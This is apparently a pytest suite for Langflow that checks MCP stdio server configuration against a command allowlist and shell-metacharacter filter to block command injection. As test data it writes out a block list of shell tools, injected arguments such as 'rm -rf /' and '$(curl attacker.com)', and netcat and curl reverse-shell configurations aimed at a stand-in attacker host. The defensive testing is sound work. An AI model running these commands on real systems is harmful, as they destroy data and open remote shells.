"""Security tests for MCP command injection vulnerability (CWE-78).

This test suite validates that the MCP stdio server configuration properly
validates commands against an allowlist to prevent arbitrary command execution.

Vulnerability: Unauthenticated attackers could add MCP stdio servers with
arbitrary commands, achieving Remote Code Execution (RCE).

Fix: Implement command allowlist validation in MCPServerConfig schema.
"""

import pytest
from langflow.api.v2.schemas import ALLOWED_MCP_COMMANDS, MCPServerConfig
from pydantic import ValidationError


class TestMCPCommandInjectionSecurity:
    """Test suite for MCP command injection security fixes."""

    # ==================== Command Validation Tests ====================

    def test_allowed_commands_accepted(self):
        """Test that all allowed commands are accepted."""
        for command in ALLOWED_MCP_COMMANDS:
            config = MCPServerConfig(command=command, args=["--version"])
            assert config.command == command

    def test_allowed_command_with_path_accepted(self):
        """Test that allowed commands with full paths are accepted."""
        # Unix-style path
        config = MCPServerConfig(command="/usr/bin/node", args=["server.js"])
        assert config.command == "/usr/bin/node"

        # Windows-style path
        config = MCPServerConfig(command="C:\\Program Files\\nodejs\\node.exe", args=["server.js"])
        assert config.command == "C:\\Program Files\\nodejs\\node.exe"

    def test_dangerous_command_rejected(self):
        """Test that dangerous commands are rejected."""
        dangerous_commands = [
            "rm",
            "curl",
            "wget",
            "bash",
            "sh",
            "cmd",
            "powershell",
            "nc",
            "netcat",
            "telnet",
        ]

        for cmd in dangerous_commands:
            with pytest.raises(ValidationError) as exc_info:
                MCPServerConfig(command=cmd, args=["-rf", "/"])

            error_msg = str(exc_info.value)
            assert "not allowed" in error_msg.lower()
            assert cmd in error_msg

    def test_command_injection_via_semicolon_rejected(self):
        """Test that command injection via semicolon is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js; rm -rf /"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_pipe_rejected(self):
        """Test that command injection via pipe is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js | bash"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_ampersand_rejected(self):
        """Test that command injection via ampersand is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js & curl attacker.com"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_backticks_rejected(self):
        """Test that command injection via backticks is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["`curl attacker.com`"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_dollar_sign_rejected(self):
        """Test that command injection via dollar sign is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["$(curl attacker.com)"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_redirect_rejected(self):
        """Test that command injection via redirect is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js > /tmp/pwned"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    def test_command_injection_via_newline_rejected(self):
        """Test that command injection via newline is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["server.js\nrm -rf /"])

        error_msg = str(exc_info.value)
        assert "dangerous shell metacharacter" in error_msg.lower()

    # ==================== Proof of Concept Tests ====================

    def test_poc_touch_command_rejected(self):
        """Test that the PoC 'touch' command from the security advisory is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="touch", args=["/tmp/pwned_langflow"])  # noqa: S108

        error_msg = str(exc_info.value)
        assert "touch" in error_msg
        assert "not allowed" in error_msg.lower()

    def test_poc_rm_command_rejected(self):
        """Test that dangerous 'rm -rf' command is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="rm", args=["-rf", "/"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_poc_curl_reverse_shell_rejected(self):
        """Test that reverse shell via curl is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="curl", args=["attacker.com/shell.sh"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    def test_poc_netcat_reverse_shell_rejected(self):
        """Test that netcat reverse shell is rejected."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="nc", args=["-e", "/bin/bash", "attacker.com", "4444"])

        error_msg = str(exc_info.value)
        assert "not allowed" in error_msg.lower()

    # ==================== Legitimate Use Cases ====================

    def test_legitimate_node_mcp_server(self):
        """Test that legitimate Node.js MCP server configuration is accepted."""
        config = MCPServerConfig(
            command="node",
            args=["path/to/mcp-server.js"],
            env={"DEBUG": "true"},
        )
        assert config.command == "node"
        assert config.args == ["path/to/mcp-server.js"]

    def test_legitimate_python_mcp_server(self):
        """Test that legitimate Python MCP server configuration is accepted."""
        config = MCPServerConfig(
            command="python3",
            args=["-m", "mcp_server"],
            env={"PYTHONPATH": "/app"},
        )
        assert config.command == "python3"
        assert config.args == ["-m", "mcp_server"]

    def test_legitimate_npx_mcp_server(self):
        """Test that legitimate npx MCP server configuration is accepted."""
        config = MCPServerConfig(
            command="npx",
            args=["@modelcontextprotocol/server-filesystem", "/tmp"],  # noqa: S108
        )
        assert config.command == "npx"
        assert config.args is not None
        assert len(config.args) == 2

    def test_legitimate_uvx_mcp_server(self):
        """Test that legitimate uvx MCP server configuration is accepted."""
        config = MCPServerConfig(
            command="uvx",
            args=["mcp-server-git", "--repository", "/path/to/repo"],
        )
        assert config.command == "uvx"
        assert config.args is not None
        assert len(config.args) == 3

    def test_legitimate_docker_mcp_server(self):
        """Test that legitimate Docker MCP server configuration is accepted."""
        config = MCPServerConfig(
            command="docker",
            args=["run", "-i", "mcp-server-image"],
        )
        assert config.command == "docker"
        assert config.args is not None
        assert config.args[0] == "run"

    # ==================== Edge Cases ====================

    def test_none_command_accepted(self):
        """Test that None command is accepted (for HTTP-based MCP servers)."""
        config = MCPServerConfig(url="https://mcp-server.example.com")
        assert config.command is None
        assert config.url == "https://mcp-server.example.com"

    def test_empty_args_accepted(self):
        """Test that empty args list is accepted."""
        config = MCPServerConfig(command="node", args=[])
        assert config.command == "node"
        assert config.args == []

    def test_none_args_accepted(self):
        """Test that None args is accepted."""
        config = MCPServerConfig(command="node")
        assert config.command == "node"
        assert config.args is None

    def test_safe_special_chars_in_args_accepted(self):
        """Test that safe special characters in args are accepted."""
        config = MCPServerConfig(
            command="node",
            args=["server.js", "--port=8080", "--host=0.0.0.0", "--config=/path/to/config.json"],
        )
        assert config.command == "node"
        assert config.args is not None
        assert len(config.args) == 4

    def test_windows_exe_extension_handled(self):
        """Test that .exe extension on Windows is properly handled."""
        config = MCPServerConfig(command="node.exe", args=["server.js"])
        assert config.command == "node.exe"

        config = MCPServerConfig(command="C:\\nodejs\\node.exe", args=["server.js"])
        assert config.command == "C:\\nodejs\\node.exe"

    # ==================== Error Message Quality ====================

    def test_error_message_includes_allowed_commands(self):
        """Test that error message includes list of allowed commands."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="malicious_command")

        error_msg = str(exc_info.value)
        # Check that error message includes at least some allowed commands
        assert "node" in error_msg.lower() or "python" in error_msg.lower()
        assert "allowed commands" in error_msg.lower()

    def test_error_message_identifies_rejected_command(self):
        """Test that error message identifies the specific rejected command."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="evil_command")

        error_msg = str(exc_info.value)
        assert "evil_command" in error_msg

    def test_error_message_for_shell_metacharacter(self):
        """Test that error message identifies the dangerous metacharacter."""
        with pytest.raises(ValidationError) as exc_info:
            MCPServerConfig(command="node", args=["test; rm -rf /"])

        error_msg = str(exc_info.value)
        assert ";" in error_msg
        assert "dangerous" in error_msg.lower()
